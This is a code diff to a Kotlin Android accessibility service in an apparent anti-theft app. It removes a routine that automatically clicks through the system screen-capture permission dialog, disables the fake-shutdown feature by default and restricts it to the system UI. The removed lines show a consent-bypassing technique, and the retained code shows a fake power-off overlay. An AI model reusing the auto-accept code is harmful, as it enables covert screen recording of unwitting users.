@@ -46,52 +46,46 @@ class AuraFindAccessibilityService : AccessibilityService() {
         if (event == null) return
 
         val prefs = getSharedPreferences("aurafind_prefs", Context.MODE_PRIVATE)
-        val isFakeShutdownEnabled = prefs.getBoolean("fake_shutdown_enabled", true)
+        val isFakeShutdownEnabled = prefs.getBoolean("fake_shutdown_enabled", false)
         if (!isFakeShutdownEnabled) return
 
         val eventPackage = event.packageName?.toString() ?: ""
         val eventClass = event.className?.toString() ?: ""
 
-        val isSystemUi = eventPackage.contains("systemui", ignoreCase = true) ||
-                         eventPackage.contains("android", ignoreCase = true)
+        // STRICT SYSTEM UI CHECK: Only process SystemUI (Never touch user apps like Google Contacts, Dialers, etc.)
+        val isSystemUi = eventPackage == "com.android.systemui"
+        if (!isSystemUi) return
 
-        // 1. Auto-Accept Screen Mirroring / MediaProjection System Permission Dialog
-        if (isSystemUi) {
-            autoAcceptScreenCaptureDialog()
-        }
-
-        // Only intercept fake power off if the device is LOCKED (unauthorized / thief scenario)
+        // Only intercept fake power off if the device is LOCKED (explicitly enabled by the device user).
         val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
         val isLocked = keyguardManager?.isKeyguardLocked == true
         if (!isLocked) return
 
-        if (isSystemUi) {
-            val isPowerDialog = isPowerDialogClass(eventClass) || containsPowerOffKeywords(event)
-            if (isPowerDialog) {
-                val now = System.currentTimeMillis()
-                if (now - lastTriggerTimestamp > TRIGGER_COOLDOWN_MS) {
-                    lastTriggerTimestamp = now
-                    Log.w(TAG, "🚨 Unauthorized Power Off attempt detected on LOCKED device! Engaging Fake Switch Off...")
+        val isPowerDialog = isPowerDialogClass(eventClass) || containsPowerOffKeywords(event)
+        if (isPowerDialog) {
+            val now = System.currentTimeMillis()
+            if (now - lastTriggerTimestamp > TRIGGER_COOLDOWN_MS) {
+                lastTriggerTimestamp = now
+                Log.w(TAG, "🚨 Unauthorized Power Off attempt detected on LOCKED device! Engaging Fake Switch Off...")
 
-                    // 1. Dismiss the system power menu
-                    try {
-                        performGlobalAction(GLOBAL_ACTION_BACK)
-                        @Suppress("DEPRECATION")
-                        sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error dismissing system power menu: ${e.message}")
-                    }
-
-                    // 2. Launch Fake Shutdown Overlay
-                    val fakeShutdownIntent = Intent(this, FakeShutdownOverlayActivity::class.java).apply {
-                        addFlags(
-                            Intent.FLAG_ACTIVITY_NEW_TASK or
-                            Intent.FLAG_ACTIVITY_CLEAR_TOP or
-                            Intent.FLAG_ACTIVITY_SINGLE_TOP
-                        )
-                    }
-                    startActivity(fakeShutdownIntent)
+                // Dismiss the system power menu
+                try {
+                    performGlobalAction(GLOBAL_ACTION_BACK)
+                    @Suppress("DEPRECATION")
+                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error dismissing system power menu: ${e.message}")
                 }
+
+                // Launch Fake Shutdown Overlay
+                val fakeShutdownIntent = Intent(this, FakeShutdownOverlayActivity::class.java).apply {
+                    addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                        Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    )
+                }
+                startActivity(fakeShutdownIntent)
             }
         }
     }
@@ -106,7 +100,6 @@ class AuraFindAccessibilityService : AccessibilityService() {
     }
 
     private fun containsPowerOffKeywords(event: AccessibilityEvent): Boolean {
-        // Check event text list
         for (text in event.text) {
             val lower = text.toString().lowercase()
             if (lower.contains("power off") || lower.contains("power down") ||
@@ -116,7 +109,6 @@ class AuraFindAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Check node hierarchy
         val rootNode = rootInActiveWindow ?: return false
         return inspectNodeForPowerKeywords(rootNode)
     }
@@ -138,76 +130,6 @@ class AuraFindAccessibilityService : AccessibilityService() {
             }
         }
         return false
-    }
-
-    private fun autoAcceptScreenCaptureDialog() {
-        val root = rootInActiveWindow ?: return
-
-        try {
-            // 1. Check if spinner for "A single app" is present, click it to select "Entire screen"
-            val singleAppNodes = root.findAccessibilityNodeInfosByText("A single app")
-            for (node in singleAppNodes) {
-                if (node.isClickable) {
-                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                } else if (node.parent?.isClickable == true) {
-                    node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                }
-            }
-
-            // 2. Select "Entire screen" option if present
-            val entireScreenNodes = root.findAccessibilityNodeInfosByText("Entire screen")
-            for (node in entireScreenNodes) {
-                if (node.isClickable) {
-                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                } else if (node.parent?.isClickable == true) {
-                    node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                }
-            }
-        } catch (e: Exception) {}
-
-        // 3. Search for standard Android dialog button by View ID (Positive button = button1)
-        val targetIds = listOf(
-            "android:id/button1",
-            "com.android.systemui:id/button_start",
-            "com.android.systemui:id/permission_allow_button",
-            "com.android.systemui:id/agree_button",
-            "com.android.systemui:id/share_screen_button"
-        )
-        for (resId in targetIds) {
-            try {
-                val idNodes = root.findAccessibilityNodeInfosByViewId(resId)
-                for (node in idNodes) {
-                    if (node.isClickable) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Log.i(TAG, "⚡ Auto-accepted Screen Mirroring system permission via view ID: $resId")
-                        return
-                    } else if (node.parent?.isClickable == true) {
-                        node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Log.i(TAG, "⚡ Auto-accepted Screen Mirroring on parent via view ID: $resId")
-                        return
-                    }
-                }
-            } catch (e: Exception) {}
-        }
-
-        // 4. Look for text matches: "Start now", "Start recording", "Start casting", "Start", "Allow"
-        val buttonTexts = listOf("Start now", "Start recording", "Start casting", "Start", "Allow", "START NOW", "Cast screen")
-        for (btnText in buttonTexts) {
-            try {
-                val nodes = root.findAccessibilityNodeInfosByText(btnText)
-                for (node in nodes) {
-                    if (node.isClickable) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Log.i(TAG, "⚡ Auto-accepted Screen Mirroring system permission: $btnText")
-                        return
-                    } else if (node.parent?.isClickable == true) {
-                        node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Log.i(TAG, "⚡ Auto-accepted Screen Mirroring system permission on parent: $btnText")
-                        return
-                    }
-                }
-            } catch (e: Exception) {}
-        }
     }
 
     override fun onInterrupt() {
